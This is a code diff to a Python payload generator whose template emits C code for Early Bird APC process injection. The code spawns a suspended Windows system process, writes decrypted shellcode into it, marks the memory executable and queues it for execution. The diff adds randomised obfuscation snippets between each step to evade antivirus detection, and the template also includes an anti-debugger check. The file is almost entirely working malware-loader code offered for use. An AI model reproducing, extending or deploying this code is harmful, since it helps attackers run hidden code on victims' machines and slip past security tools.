@@ -1,24 +1,34 @@
+import secrets
+
 from Encryption.Choose_Decryption import Choose_Decryption
-def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key_var,key_hex,encryption_type):
+from Evasion.Obfuscator import obfuscator
+
+def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key_var,key_hex,encryption_type,array,size):
     EarlyBird_Injection=f"""
     unsigned char {shellcode_var}[] = {ciphertext_split}
 
             if (!executed)
             {{
-
+                
+                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                
                 executed = TRUE;
 
                 LPVOID allocation_start;
                 SIZE_T allocation_size = sizeof({shellcode_var});
                 NTSTATUS status = NULL;
-
+                
+                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                
                 allocation_start = nullptr;
 
                 char {key_var}[] = "{key_hex}";
 
                 STARTUPINFOA si = {{ 0 }};
                 PROCESS_INFORMATION pi = {{ 0 }};
-
+                
+                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                
                 CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
                 HANDLE victimProcess = pi.hProcess;
                 HANDLE threadHandle = pi.hThread;
@@ -48,16 +58,22 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key
                 CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);
                 // Allocate Virtual Memory 
                 NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
+                
+                {obfuscator(secrets.choice(array),secrets.choice(size))}
               
                {Choose_Decryption(encryption_type,xor_func,shellcode_var,key_var)}
 
                 // Copy shellcode into allocated memory
                 NtWriteVirtualMemory(victimProcess, allocation_start, {shellcode_var}, sizeof({shellcode_var}), 0);
                 NtProtectVirtualMemory(victimProcess, &allocation_start, (PSIZE_T)&allocation_size, PAGE_EXECUTE_READ, &oldProtect);
-
+                
+                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                
                 NtQueueApcThread(threadHandle, PKNORMAL_ROUTINE(allocation_start), allocation_start, NULL, NULL);
                 NtResumeThread(threadHandle, NULL);
+                
+                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                
                 return 0;
             }}
     """
